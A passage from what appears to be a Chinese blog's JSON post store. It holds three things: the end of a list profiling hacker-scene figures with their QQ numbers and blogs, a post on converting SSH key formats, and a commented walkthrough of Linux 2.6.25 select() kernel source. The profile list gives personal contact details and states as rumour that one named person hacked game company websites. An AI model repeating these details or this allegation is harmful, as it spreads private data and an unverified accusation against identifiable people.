/>朱巨源。写过入门级的文章。在X档案有过投稿。也写过书《黑客攻防实战入门》。对一般的渗透技术有一定了解。<br /><br />虫子<br />QQ:712663200<br />博客:<a target=\"_blank\" href=\"http://evilh4ck.blog.sohu.com/\" rel=\"noopener noreferrer\">http://evilh4ck.blog.sohu.com/</a><br />虫总据说是入侵过不少游戏官方网站。看来应该赚了些钱。此人对入侵攻击还是有很多了解的。<br /><br />amxking<br />博客:<a target=\"_blank\" href=\"http://amxking.bokee.com/\" rel=\"noopener noreferrer\">http://amxking.bokee.com</a><br />QQ:5711277<br />红狼的核心成员，也是天阳的管理。<br /><br />七剑<br />QQ:7259561<br />博客:<a target=\"_blank\" href=\"http://1v1.name/\" rel=\"noopener noreferrer\">http://1v1.name</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/qijian\" rel=\"noopener noreferrer\">http://t.qq.com/qijian</a><br />搞WEB脚本，数据库，渗透攻击的。<br /><br />啊D<br />QQ:9269563<br />网站:<a target=\"_blank\" href=\"http://www.d99net.net/\" rel=\"noopener noreferrer\">http://www.d99net.net/</a><br />入行时间不短了，写过一些比较出名的工具，如早期的啊D网络工具包和后来的啊D注入工具。从这些可以看出对注入，编程是有一定了解的。经验比较丰富，工具虽然有BUG但还算稳定。<br /><br />雨夜<br />QQ:9148357<br />博客:<br />混迹黑客全也有数年。技术凑合。曾经也开办过黑客网站。<br /><br />redbin<br />QQ:35475<br />网站:<a target=\"_blank\" href=\"http://www.vip8.org/\" rel=\"noopener noreferrer\">http://www.vip8.org/</a><br />红滨。校园黑客联盟站长。<br /></p>\n"},{"title":"OpenSSH key pem和SSH2 key格式互转 （openssh 高版本）","date":"2013-05-08T15:29:58.000Z","_content":"openssl genkey 和 ssk-keygen  密钥的格式是不一样的\n“RFC4716” (RFC 4716/SSH2 public or private key)\n“PKCS8” (PEM PKCS8 public key)\nubuntu:\nssh-keygen -e -f ~/.ssh/id_rsa.pub > ~/.ssh/id_rsa_pub.pem\nssh-keygen  -f ~/.ssh/id_rsa_pub.pem -i -m RFC4716 > ~/.ssh/id_rsa.pub\nwindows:\n1)Use the puttyGen\n2) Run puttygen and click generate\n3) Run your mouse round the blank part for a while.\n4) Enter a keyphrase (and repeat)\n5) Click save public key and save it <path>publickey\n6) Click save private key and save it <path>privatekey (extension gets added automatically, this is no good for spoon, but good for putty)\n7) Click Conversions->Export OpenSSH key and save as <path>sshkey.pem\n8) In the main window is you key for pasting into OpenSSH authorized_keys file. Copy this in its entirety and past it into your ubuntu machine in /home/<user>/.ssh/authorized_keys file.\n9) Ok, you can close putty key generator.\n10) Utilize the .pem in the tool.\nhttp://www.yinqisen.cn/blog-177.html","source":"_posts/OpenSSH-key-pem和SSH2-key格式互转-（openssh-高版本）.md","raw":"title: OpenSSH key pem和SSH2 key格式互转 （openssh 高版本）\ncategories: [网络安全]\ntags: \ndate: 2013-05-08 23:29:58\n---\nopenssl genkey 和 ssk-keygen  密钥的格式是不一样的\n“RFC4716” (RFC 4716/SSH2 public or private key)\n“PKCS8” (PEM PKCS8 public key)\nubuntu:\nssh-keygen -e -f ~/.ssh/id_rsa.pub > ~/.ssh/id_rsa_pub.pem\nssh-keygen  -f ~/.ssh/id_rsa_pub.pem -i -m RFC4716 > ~/.ssh/id_rsa.pub\nwindows:\n1)Use the puttyGen\n2) Run puttygen and click generate\n3) Run your mouse round the blank part for a while.\n4) Enter a keyphrase (and repeat)\n5) Click save public key and save it <path>publickey\n6) Click save private key and save it <path>privatekey (extension gets added automatically, this is no good for spoon, but good for putty)\n7) Click Conversions->Export OpenSSH key and save as <path>sshkey.pem\n8) In the main window is you key for pasting into OpenSSH authorized_keys file. Copy this in its entirety and past it into your ubuntu machine in /home/<user>/.ssh/authorized_keys file.\n9) Ok, you can close putty key generator.\n10) Utilize the .pem in the tool.\nhttp://www.yinqisen.cn/blog-177.html","slug":"OpenSSH-key-pem和SSH2-key格式互转-（openssh-高版本）","published":1,"updated":"2023-04-22T05:49:10.288Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrkb5qr000174pi3794fhe0","content":"<p>openssl genkey 和 ssk-keygen  密钥的格式是不一样的<br>“RFC4716” (RFC 4716&#x2F;SSH2 public or private key)<br>“PKCS8” (PEM PKCS8 public key)<br>ubuntu:<br>ssh-keygen -e -f ~&#x2F;.ssh&#x2F;id_rsa.pub &gt; ~&#x2F;.ssh&#x2F;id_rsa_pub.pem<br>ssh-keygen  -f ~&#x2F;.ssh&#x2F;id_rsa_pub.pem -i -m RFC4716 &gt; ~&#x2F;.ssh&#x2F;id_rsa.pub<br>windows:<br>1)Use the puttyGen<br>2) Run puttygen and click generate<br>3) Run your mouse round the blank part for a while.<br>4) Enter a keyphrase (and repeat)<br>5) Click save public key and save it <path>publickey<br>6) Click save private key and save it <path>privatekey (extension gets added automatically, this is no good for spoon, but good for putty)<br>7) Click Conversions-&gt;Export OpenSSH key and save as <path>sshkey.pem<br>8) In the main window is you key for pasting into OpenSSH authorized_keys file. Copy this in its entirety and past it into your ubuntu machine in &#x2F;home&#x2F;<user>&#x2F;.ssh&#x2F;authorized_keys file.<br>9) Ok, you can close putty key generator.<br>10) Utilize the .pem in the tool.<br><a href=\"http://www.yinqisen.cn/blog-177.html\">http://www.yinqisen.cn/blog-177.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>openssl genkey 和 ssk-keygen  密钥的格式是不一样的<br>“RFC4716” (RFC 4716&#x2F;SSH2 public or private key)<br>“PKCS8” (PEM PKCS8 public key)<br>ubuntu:<br>ssh-keygen -e -f ~&#x2F;.ssh&#x2F;id_rsa.pub &gt; ~&#x2F;.ssh&#x2F;id_rsa_pub.pem<br>ssh-keygen  -f ~&#x2F;.ssh&#x2F;id_rsa_pub.pem -i -m RFC4716 &gt; ~&#x2F;.ssh&#x2F;id_rsa.pub<br>windows:<br>1)Use the puttyGen<br>2) Run puttygen and click generate<br>3) Run your mouse round the blank part for a while.<br>4) Enter a keyphrase (and repeat)<br>5) Click save public key and save it <path>publickey<br>6) Click save private key and save it <path>privatekey (extension gets added automatically, this is no good for spoon, but good for putty)<br>7) Click Conversions-&gt;Export OpenSSH key and save as <path>sshkey.pem<br>8) In the main window is you key for pasting into OpenSSH authorized_keys file. Copy this in its entirety and past it into your ubuntu machine in &#x2F;home&#x2F;<user>&#x2F;.ssh&#x2F;authorized_keys file.<br>9) Ok, you can close putty key generator.<br>10) Utilize the .pem in the tool.<br><a href=\"http://www.yinqisen.cn/blog-177.html\">http://www.yinqisen.cn/blog-177.html</a></p>\n"},{"title":"Linux-2.6.25 select系统调用源码分析","date":"2013-12-24T15:06:35.000Z","_content":"Linux 2.6.25中的select系统调用\n主要有4个函数:\nsys_select：处理时间参数，调用core_sys_select。\ncore_sys_select：处理三个fd_set参数，调用do_select。\ndo_select：做select/poll的工作。在合适的时机把自己挂起等待，调用sock_poll。\nsock_poll：用函数指针分派到具体的协议层函数tcp_poll、udp_poll、datagram_poll。\n层层分工明确，我也要多学习这种方式啊。\n<pre>\n/*\nsys_select(fs/select.c)\n处理了超时值（如果有）,将struct timeval转换成了时钟周期数,调用core_sys_select,然后检查剩余时间,处理时间\n*/\nasmlinkage long sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n\t\t\t\t\t\t   fd_set __user *exp, struct timeval __user *tvp)\n{\n\ts64 timeout = -1;\n\tstruct timeval tv;\n\tint ret;\n\tif (tvp) {/*如果有超时值*/\n\t\tif (copy_from_user(&tv, tvp, sizeof(tv)))\n\t\t\treturn -EFAULT;\n\t\tif (tv.tv_sec < 0 || tv.tv_usec < 0)/*时间无效*/\n\t\t\treturn -EINVAL;\n\t\t/* Cast to u64 to make GCC stop complaining */\n\t\tif ((u64)tv.tv_sec >= (u64)MAX_INT64_SECONDS)\n\t\t\ttimeout = -1;\t/* 无限等待*/\n\t\telse {\n\t\t\ttimeout = DIV_ROUND_UP(tv.tv_usec, USEC_PER_SEC/HZ);\n\t\t\ttimeout += tv.tv_sec * HZ;/*计算出超时的相对时间,单位为时钟周期数*/\n\t\t}\n\t}\n\t/*主要工作都在core_sys_select中做了*/\n\tret = core_sys_select(n, inp, outp, exp, &timeout);\n\tif (tvp) {/*如果有超时值*/\n\t\tstruct timeval rtv;\n\t\tif (current->personality & STICKY_TIMEOUTS)/*模拟bug的一个机制,不详细描述*/\n\t\t\tgoto sticky;\n\t\t/*rtv中是剩余的时间*/\n\t\trtv.tv_usec = jiffies_to_usecs(do_div((*(u64*)&timeout), HZ));\n\t\trtv.tv_sec = timeout;\n\t\tif (timeval_compare(&rtv, &tv) >= 0)/*如果core_sys_select超时返回,更新时间*/\n\t\t\trtv = tv;\n\t\t/*拷贝更新后的时间到用户空间*/\n\t\tif (copy_to_user(tvp, &rtv, sizeof(rtv))) {\nsticky:\n\t\t\t/*\n\t\t\t* If an application puts its timeval in read-only\n\t\t\t* memory, we don't want the Linux-specific update to\n\t\t\t* the timeval to cause a fault after the select has\n\t\t\t* completed successfully. However, because we're not\n\t\t\t* updating the timeval, we can't restart the system\n\t\t\t* call.\n\t\t\t*/\n\t\t\tif (ret == -ERESTARTNOHAND)/*ERESTARTNOHAND表明,被中断的系统调用*/\n\t\t\t\tret = -EINTR;\n\t\t}\n\t}\n\treturn ret;\n}\n/*core_sys_select\n为do_select准备好了位图,然后调用do_select,将返回的结果集,返回到用户空间\n*/\nstatic int core_sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n\t\t\t\t\t\t   fd_set __user *exp, s64 *timeout)\n{\n\tfd_set_bits fds;\n\tvoid *bits;\n\tint ret, max_fds;\n\tunsigned int size;\n\tstruct fdtable *fdt;\n\t/* Allocate small arguments on the stack to save memory and be faster */\n\t/*SELECT_STACK_ALLOC 定义为256*/\n\tlong stack_fds[SELECT_STACK_ALLOC/sizeof(long)];\n\tret = -EINVAL;\n\tif (n < 0)\n\t\tgoto out_nofds;\n\t/* max_fds can increase, so grab it once to avoid race */\n\trcu_read_lock();\n\tfdt = files_fdtable(current->files);/*获取当前进程的文件描述符表*/\n\tmax_fds = fdt->max_fds;\n\trcu_read_unlock();\n\tif (n > max_fds)/*修正用户传入的第一个参数：fd_set中文件描述符的最大值*/\n\t\tn = max_fds;\n\t/*\n\t* We need 6 bitmaps (in/out/ex for both incoming and outgoing),\n\t* since we used fdset we need to allocate memory in units of\n\t* long-words.\n\t*/\n\t/*\n\t如果stack_fds数组的大小不能容纳下所有的fd_set,就用kmalloc重新分配一个大数组。\n\t然后将位图平均分成份,并初始化fds结构\n\t*/\n\tsize = FDS_BYTES(n);\n\tbits = stack_fds;\n\tif (size > sizeof(stack_fds) / 6) {\n\t\t/* Not enough space in on-stack array; must use kmalloc */\n\t\tret = -ENOMEM;\n\t\tbits = kmalloc(6 * size, GFP_KERNEL);\n\t\tif (!bits)\n\t\t\tgoto out_nofds;\n\t}\n\tfds.in      = bits;\n\tfds.out     = bits +   size;\n\tfds.ex      = bits + 2*size;\n\tfds.res_in  = bits + 3*size;\n\tfds.res_out = bits + 4*size;\n\tfds.res_ex  = bits + 5*size;\n\t/*get_fd_set仅仅调用copy_from_user从用户空间拷贝了fd_set*/\n\tif ((ret = get_fd_set(n, inp, fds.in)) ||\n\t\t(ret = get_fd_set(n, outp, fds.out)) ||\n\t\t(ret = get_fd_set(n, exp, fds.ex)))\n\t\tgoto out;\n\tzero_fd_set(n, fds.res_in);\n\tzero_fd_set(n, fds.res_out);\n\tzero_fd_set(n, fds.res_ex);\n\t/*\n\t接力棒传给了do_select\n\t*/\n\tret = do_select(n, &fds, timeout);\n\tif (ret < 0)\n\t\tgoto out;\n\t/*do_select返回,是一种异常状态*/\n\tif (!ret) {\n\t\t/*记得上面的sys_select不？将ERESTARTNOHAND转换成了EINTR并返回。EINTR表明系统调用被中断*/\n\t\tret = -ERESTARTNOHAND;\n\t\tif (signal_pending(current))/*当当前进程有信号要处理时,signal_pending返回真,这符合了EINTR的语义*/\n\t\t\tgoto out;\n\t\tret = 0;\n\t}\n\t/*把结果集,拷贝回用户空间*/\n\tif (set_fd_set(n, inp, fds.res_in) ||\n\t\tset_fd_set(n, outp, fds.res_out) ||\n\t\tset_fd_set(n, exp, fds.res_ex))\n\t\tret = -EFAULT;\nout:\n\tif (bits != stack_fds)\n\t\tkfree(bits);/*对应上面的kmalloc*/\nout_nofds:\n\treturn ret;\n}\n/*do_select\n真正的select在此,遍历了所有的fd,调用对应的xxx_poll函数\n*/\nint do_select(int n, fd_set_bits *fds, s64 *timeout)\n{\n\tstruct poll_wqueues table;\n\tpoll_table *wait;\n\tint retval, i;\n\trcu_read_lock();\n\t/*根据已经打开fd的位图检查用户打开的fd, 要求对应fd必须打开, 并且返回最大的fd*/\n\tretval = max_select_fd(n, fds);\n\trcu_read_unlock();\n\tif (retval < 0)\n\t\treturn retval;\n\tn = retval;\n\t/*将当前进程放入自已的等待队列table, 并将该等待队列加入到该测试表wait*/\n\tpoll_initwait(&table);\n\twait = &table.pt;\n\tif (!*timeout)\n\t\twait = NULL;\n\tretval = 0;\n\tfor (;;) {/*死循环*/\n\t\tunsigned long *rinp, *routp, *rexp, *inp, *outp, *exp;\n\t\tlong __timeout;\n\t\t/*注意:可中断的睡眠状态*/\n\t\tset_current_state(TASK_INTERRUPTIBLE);\n\t\tinp = fds->in; outp = fds->out; exp = fds->ex;\n\t\trinp = fds->res_in; routp = fds->res_out; rexp = fds->res_ex;\n\t\tfor (i = 0; i < n; ++rinp, ++routp, ++rexp) {/*遍历所有fd*/\n\t\t\tunsigned long in, out, ex, all_bits, bit = 1, mask, j;\n\t\t\tunsigned long res_in = 0, res_out = 0, res_ex = 0;\n\t\t\tconst struct file_operations *f_op = NULL;\n\t\t\tstruct file *file = NULL;\n\t\t\tin = *inp++; out = *outp++; ex = *exp++;\n\t\t\tall_bits = in | out | ex;\n\t\t\tif (all_bits == 0) {\n\t\t\t\t/*\n\t\t\t\t__NFDBITS定义为(8 * sizeof(unsigned long)),即long的位数。\n\t\t\t\t因为一个long代表了__NFDBITS位，所以跳到下一个位图i要增加__NFDBITS\n\t\t\t\t*/\n\t\t\t\ti += __NFDBITS;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfor (j = 0; j < __NFDBITS; ++j, ++i, bit <<= 1) {\n\t\t\t\tint fput_needed;\n\t\t\t\tif (i >= n)\n\t\t\t\t\tbreak;\n\t\t\t\t/*测试每一位*/\n\t\t\t\tif (!(bit & all_bits))\n\t\t\t\t\tcontinue;\n\t\t\t\t/*得到file结构指针，并增加引用计数字段f_count*/\n\t\t\t\tfile = fget_light(i, &fput_needed);\n\t\t\t\tif (file) {\n\t\t\t\t\tf_op = file->f_op;\n\t\t\t\t\tmask = DEFAULT_POLLMASK;\n\t\t\t\t\t/*对于socket描述符,f_op->poll对应的函数是sock_poll\n\t\t\t\t\t注意第三个参数是等待队列，在poll成功后会将本进程唤醒执行*/\n\t\t\t\t\tif (f_op && f_op->poll)\n\t\t\t\t\t\tmask = (*f_op->poll)(file, retval ? NULL : wait);\n\t\t\t\t\t/*释放file结构指针，实际就是减小他的一个引用计数字段f_count*/\n\t\t\t\t\tfput_light(file, fput_needed);\n\t\t\t\t\t/*根据poll的结果设置状态,要返回select出来的fd数目，所以retval++。\n\t\t\t\t\t注意：retval是in out ex三个集合的总和*/\n\t\t\t\t\tif ((mask & POLLIN_SET) && (in & bit)) {\n\t\t\t\t\t\tres_in |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t\tif ((mask & POLLOUT_SET) && (out & bit)) {\n\t\t\t\t\t\tres_out |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t\tif ((mask & POLLEX_SET) && (ex & bit)) {\n\t\t\t\t\t\tres_ex |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t/*\n\t\t\t\t注意前面的set_current_state(TASK_INTERRUPTIBLE);\n\t\t\t\t因为已经进入TASK_INTERRUPTIBLE状态,所以cond_resched回调度其他进程来运行，\n\t\t\t\t这里的目的纯粹是为了增加一个抢占点。被抢占后，由等待队列机制唤醒。\n\t\t\t\t在支持抢占式调度的内核中（定义了CONFIG_PREEMPT），cond_resched是空操作\n\t\t\t\t*/\n\t\t\t\tcond_resched();\n\t\t\t}\n\t\t\t/*根据poll的结果写回到输出位图里*/\n\t\t\tif (res_in)\n\t\t\t\t*rinp = res_in;\n\t\t\tif (res_out)\n\t\t\t\t*routp = res_out;\n\t\t\tif (res_ex)\n\t\t\t\t*rexp = res_ex;\n\t\t}\n\t\twait = NULL;\n\t\tif (retval || !*timeout || signal_pending(current))/*signal_pending前面说过了*/\n\t\t\tbreak;\n\t\tif(table.error) {\n\t\t\tretval = table.error;\n\t\t\tbreak;\n\t\t}\n\t\tif (*timeout < 0) {\n\t\t\t/*无限等待*/\n\t\t\t__timeout = MAX_SCHEDULE_TIMEOUT;\n\t\t} else if (unlikely(*timeout >= (s64)MAX_SCHEDULE_TIMEOUT - 1)) {\n\t\t\t/* 时间超过MAX_SCHEDULE_TIMEOUT,即schedule_timeout允许的最大值，用一个循环来不断减少超时值*/\n\t\t\t__timeout = MAX_SCHEDULE_TIMEOUT - 1;\n\t\t\t*timeout -= __timeout;\n\t\t} else {\n\t\t\t/*等待一段时间*/\n\t\t\t__timeout = *timeout;\n\t\t\t*timeout = 0;\n\t\t}\n\t\t/*TASK_INTERRUPTIBLE状态下，调用schedule_timeout的进程会在收到信号后重新得到调度的机会，\n\t\t即schedule_timeout返回,并返回剩余的时钟周期数\n\t\t*/\n\t\t__timeout = schedule_timeout(__timeout);\n\t\tif (*timeout >= 0)\n\t\t\t*timeout += __timeout;\n\t}\n\t/*设置为运行状态*/\n\t__set_current_state(TASK_RUNNING);\n\t/*清理等待队列*/\n\tpoll_freewait(&table);\n\treturn retval;\n}\nstatic unsigned int sock_poll(struct file *file, poll_table *wait)\n{\n\tstruct socket *sock;\n\t/*约定socket的file->private_data字段放着对应的socket结构指针*/\n\tsock = file->private_data;\n\t/*对应了三个协议的函数tcp_poll,udp_poll,datagram_poll，其中udp_poll几乎直接调用了datagram_poll\n\t累了，先休息一下，这三个函数以后分析*/\n\treturn sock->ops->poll(file, sock, wait);\n}\n</pre>\n其他重要函数一览\nstatic int max_select_fd(unsigned long n, fd_set_bits *fds)\n返回在fd_set中已经打开的，并且小于用户指定最大值，的fd\nstatic inline int get_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)\n从用户空间拷贝fd_set到内核\nstatic inline void zero_fd_set(unsigned long nr, unsigned long *fdset)\n把fd_set清零\nstatic inline unsigned long __must_check set_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)\n把fd_set拷贝回用户空间\nstatic inline int signal_pending(struct task_struct *p)\n目前进程有信号需要处理\nstruct file *fget_light(unsigned int fd, int *fput_needed)\n由fd得到其对应的file结构指针，并增加其引用计数\nstatic inline void fput_light(struct file *file, int fput_needed)\n释放由fget_light得到的file结构指针，减少其引用计数\nset_current_state\n设置当前进程的状态\nstatic inline int cond_resched(void)\n判断是否有进程需要抢占当前进程，如果是将立即发生调度。就是额外增加一个抢占点。\nsigned long __sched schedule_timeout(signed long timeout)\n当前进程睡眠timeout个jiffies\nrcu_read_lock\nrcu_read_unlock\nLinux 2.6新加入的rcu锁。读锁的加锁、解锁函数\n参考http://www.ibm.com/developerworks/cn/linux/l-rcu\npoll_freewait\npoll_initwait\npoll_wait\n...\n和文件IO，poll机制有关的几个函数，参考《Linux设备驱动(第三版)》6.3\ntcp_poll\nudp_poll\ndatagram_poll\n协议层的poll函数\n文件出处：http://zhangyafeikimi.iteye.com/blog/248815","source":"_posts/Linux-2.6.25-select系统调用源码分析.md","raw":"title: Linux-2.6.25 select系统调用源码分析\ncategories: [程序设计,操作系统,Linux,C编程]\ntags: \ndate: 2013-12-24 23:06:35\n---\nLinux 2.6.25中的select系统调用\n主要有4个函数:\nsys_select：处理时间参数，调用core_sys_select。\ncore_sys_select：处理三个fd_set参数，调用do_select。\ndo_select：做select/poll的工作。在合适的时机把自己挂起等待，调用sock_poll。\nsock_poll：用函数指针分派到具体的协议层函数tcp_poll、udp_poll、datagram_poll。\n层层分工明确，我也要多学习这种方式啊。\n<pre>\n/*\nsys_select(fs/select.c)\n处理了超时值（如果有）,将struct timeval转换成了时钟周期数,调用core_sys_select,然后检查剩余时间,处理时间\n*/\nasmlinkage long sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n\t\t\t\t\t\t   fd_set __user *exp, struct timeval __user *tvp)\n{\n\ts64 timeout = -1;\n\tstruct timeval tv;\n\tint ret;\n\tif (tvp) {/*如果有超时值*/\n\t\tif (copy_from_user(&tv, tvp, sizeof(tv)))\n\t\t\treturn -EFAULT;\n\t\tif (tv.tv_sec < 0 || tv.tv_usec < 0)/*时间无效*/\n\t\t\treturn -EINVAL;\n\t\t/* Cast to u64 to make GCC stop complaining */\n\t\tif ((u64)tv.tv_sec >= (u64)MAX_INT64_SECONDS)\n\t\t\ttimeout = -1;\t/* 无限等待*/\n\t\telse {\n\t\t\ttimeout = DIV_ROUND_UP(tv.tv_usec, USEC_PER_SEC/HZ);\n\t\t\ttimeout += tv.tv_sec * HZ;/*计算出超时的相对时间,单位为时钟周期数*/\n\t\t}\n\t}\n\t/*主要工作都在core_sys_select中做了*/\n\tret = core_sys_select(n, inp, outp, exp, &timeout);\n\tif (tvp) {/*如果有超时值*/\n\t\tstruct timeval rtv;\n\t\tif (current->personality & STICKY_TIMEOUTS)/*模拟bug的一个机制,不详细描述*/\n\t\t\tgoto sticky;\n\t\t/*rtv中是剩余的时间*/\n\t\trtv.tv_usec = jiffies_to_usecs(do_div((*(u64*)&timeout), HZ));\n\t\trtv.tv_sec = timeout;\n\t\tif (timeval_compare(&rtv, &tv) >= 0)/*如果core_sys_select超时返回,更新时间*/\n\t\t\trtv = tv;\n\t\t/*拷贝更新后的时间到用户空间*/\n\t\tif (copy_to_user(tvp, &rtv, sizeof(rtv))) {\nsticky:\n\t\t\t/*\n\t\t\t* If an application puts its timeval in read-only\n\t\t\t* memory, we don't want the Linux-specific update to\n\t\t\t* the timeval to cause a fault after the select has\n\t\t\t* completed successfully. However, because we're not\n\t\t\t* updating the timeval, we can't restart the system\n\t\t\t* call.\n\t\t\t*/\n\t\t\tif (ret == -ERESTARTNOHAND)/*ERESTARTNOHAND表明,被中断的系统调用*/\n\t\t\t\tret = -EINTR;\n\t\t}\n\t}\n\treturn ret;\n}\n/*core_sys_select\n为do_select准备好了位图,然后调用do_select,将返回的结果集,返回到用户空间\n*/\nstatic int core_sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n\t\t\t\t\t\t   fd_set __user *exp, s64 *timeout)\n{\n\tfd_set_bits fds;\n\tvoid *bits;\n\tint ret, max_fds;\n\tunsigned int size;\n\tstruct fdtable *fdt;\n\t/* Allocate small arguments on the stack to save memory and be faster */\n\t/*SELECT_STACK_ALLOC 定义为256*/\n\tlong stack_fds[SELECT_STACK_ALLOC/sizeof(long)];\n\tret = -EINVAL;\n\tif (n < 0)\n\t\tgoto out_nofds;\n\t/* max_fds can increase, so grab it once to avoid race */\n\trcu_read_lock();\n\tfdt = files_fdtable(current->files);/*获取当前进程的文件描述符表*/\n\tmax_fds = fdt->max_fds;\n\trcu_read_unlock();\n\tif (n > max_fds)/*修正用户传入的第一个参数：fd_set中文件描述符的最大值*/\n\t\tn = max_fds;\n\t/*\n\t* We need 6 bitmaps (in/out/ex for both incoming and outgoing),\n\t* since we used fdset we need to allocate memory in units of\n\t* long-words.\n\t*/\n\t/*\n\t如果stack_fds数组的大小不能容纳下所有的fd_set,就用kmalloc重新分配一个大数组。\n\t然后将位图平均分成份,并初始化fds结构\n\t*/\n\tsize = FDS_BYTES(n);\n\tbits = stack_fds;\n\tif (size > sizeof(stack_fds) / 6) {\n\t\t/* Not enough space in on-stack array; must use kmalloc */\n\t\tret = -ENOMEM;\n\t\tbits = kmalloc(6 * size, GFP_KERNEL);\n\t\tif (!bits)\n\t\t\tgoto out_nofds;\n\t}\n\tfds.in      = bits;\n\tfds.out     = bits +   size;\n\tfds.ex      = bits + 2*size;\n\tfds.res_in  = bits + 3*size;\n\tfds.res_out = bits + 4*size;\n\tfds.res_ex  = bits + 5*size;\n\t/*get_fd_set仅仅调用copy_from_user从用户空间拷贝了fd_set*/\n\tif ((ret = get_fd_set(n, inp, fds.in)) ||\n\t\t(ret = get_fd_set(n, outp, fds.out)) ||\n\t\t(ret = get_fd_set(n, exp, fds.ex)))\n\t\tgoto out;\n\tzero_fd_set(n, fds.res_in);\n\tzero_fd_set(n, fds.res_out);\n\tzero_fd_set(n, fds.res_ex);\n\t/*\n\t接力棒传给了do_select\n\t*/\n\tret = do_select(n, &fds, timeout);\n\tif (ret < 0)\n\t\tgoto out;\n\t/*do_select返回,是一种异常状态*/\n\tif (!ret) {\n\t\t/*记得上面的sys_select不？将ERESTARTNOHAND转换成了EINTR并返回。EINTR表明系统调用被中断*/\n\t\tret = -ERESTARTNOHAND;\n\t\tif (signal_pending(current))/*当当前进程有信号要处理时,signal_pending返回真,这符合了EINTR的语义*/\n\t\t\tgoto out;\n\t\tret = 0;\n\t}\n\t/*把结果集,拷贝回用户空间*/\n\tif (set_fd_set(n, inp, fds.res_in) ||\n\t\tset_fd_set(n, outp, fds.res_out) ||\n\t\tset_fd_set(n, exp, fds.res_ex))\n\t\tret = -EFAULT;\nout:\n\tif (bits != stack_fds)\n\t\tkfree(bits);/*对应上面的kmalloc*/\nout_nofds:\n\treturn ret;\n}\n/*do_select\n真正的select在此,遍历了所有的fd,调用对应的xxx_poll函数\n*/\nint do_select(int n, fd_set_bits *fds, s64 *timeout)\n{\n\tstruct poll_wqueues table;\n\tpoll_table *wait;\n\tint retval, i;\n\trcu_read_lock();\n\t/*根据已经打开fd的位图检查用户打开的fd, 要求对应fd必须打开, 并且返回最大的fd*/\n\tretval = max_select_fd(n, fds);\n\trcu_read_unlock();\n\tif (retval < 0)\n\t\treturn retval;\n\tn = retval;\n\t/*将当前进程放入自已的等待队列table, 并将该等待队列加入到该测试表wait*/\n\tpoll_initwait(&table);\n\twait = &table.pt;\n\tif (!*timeout)\n\t\twait = NULL;\n\tretval = 0;\n\tfor (;;) {/*死循环*/\n\t\tunsigned long *rinp, *routp, *rexp, *inp, *outp, *exp;\n\t\tlong __timeout;\n\t\t/*注意:可中断的睡眠状态*/\n\t\tset_current_state(TASK_INTERRUPTIBLE);\n\t\tinp = fds->in; outp = fds->out; exp = fds->ex;\n\t\trinp = fds->res_in; routp = fds->res_out; rexp = fds->res_ex;\n\t\tfor (i = 0; i < n; ++rinp, ++routp, ++rexp) {/*遍历所有fd*/\n\t\t\tunsigned long in, out, ex, all_bits, bit = 1, mask, j;\n\t\t\tunsigned long res_in = 0, res_out = 0, res_ex = 0;\n\t\t\tconst struct file_operations *f_op = NULL;\n\t\t\tstruct file *file = NULL;\n\t\t\tin = *inp++; out = *outp++; ex = *exp++;\n\t\t\tall_bits = in | out | ex;\n\t\t\tif (all_bits == 0) {\n\t\t\t\t/*\n\t\t\t\t__NFDBITS定义为(8 * sizeof(unsigned long)),即long的位数。\n\t\t\t\t因为一个long代表了__NFDBITS位，所以跳到下一个位图i要增加__NFDBITS\n\t\t\t\t*/\n\t\t\t\ti += __NFDBITS;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfor (j = 0; j < __NFDBITS; ++j, ++i, bit <<= 1) {\n\t\t\t\tint fput_needed;\n\t\t\t\tif (i >= n)\n\t\t\t\t\tbreak;\n\t\t\t\t/*测试每一位*/\n\t\t\t\tif (!(bit & all_bits))\n\t\t\t\t\tcontinue;\n\t\t\t\t/*得到file结构指针，并增加引用计数字段f_count*/\n\t\t\t\tfile = fget_light(i, &fput_needed);\n\t\t\t\tif (file) {\n\t\t\t\t\tf_op = file->f_op;\n\t\t\t\t\tmask = DEFAULT_POLLMASK;\n\t\t\t\t\t/*对于socket描述符,f_op->poll对应的函数是sock_poll\n\t\t\t\t\t注意第三个参数是等待队列，在poll成功后会将本进程唤醒执行*/\n\t\t\t\t\tif (f_op && f_op->poll)\n\t\t\t\t\t\tmask = (*f_op->poll)(file, retval ? NULL : wait);\n\t\t\t\t\t/*释放file结构指针，实际就是减小他的一个引用计数字段f_count*/\n\t\t\t\t\tfput_light(file, fput_needed);\n\t\t\t\t\t/*根据poll的结果设置状态,要返回select出来的fd数目，所以retval++。\n\t\t\t\t\t注意：retval是in out ex三个集合的总和*/\n\t\t\t\t\tif ((mask & POLLIN_SET) && (in & bit)) {\n\t\t\t\t\t\tres_in |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t\tif ((mask & POLLOUT_SET) && (out & bit)) {\n\t\t\t\t\t\tres_out |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t\tif ((mask & POLLEX_SET) && (ex & bit)) {\n\t\t\t\t\t\tres_ex |= bit;\n\t\t\t\t\t\tretval++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t/*\n\t\t\t\t注意前面的set_current_state(TASK_INTERRUPTIBLE);\n\t\t\t\t因为已经进入TASK_INTERRUPTIBLE状态,所以cond_resched回调度其他进程来运行，\n\t\t\t\t这里的目的纯粹是为了增加一个抢占点。被抢占后，由等待队列机制唤醒。\n\t\t\t\t在支持抢占式调度的内核中（定义了CONFIG_PREEMPT），cond_resched是空操作\n\t\t\t\t*/\n\t\t\t\tcond_resched();\n\t\t\t}\n\t\t\t/*根据poll的结果写回到输出位图里*/\n\t\t\tif (res_in)\n\t\t\t\t*rinp = res_in;\n\t\t\tif 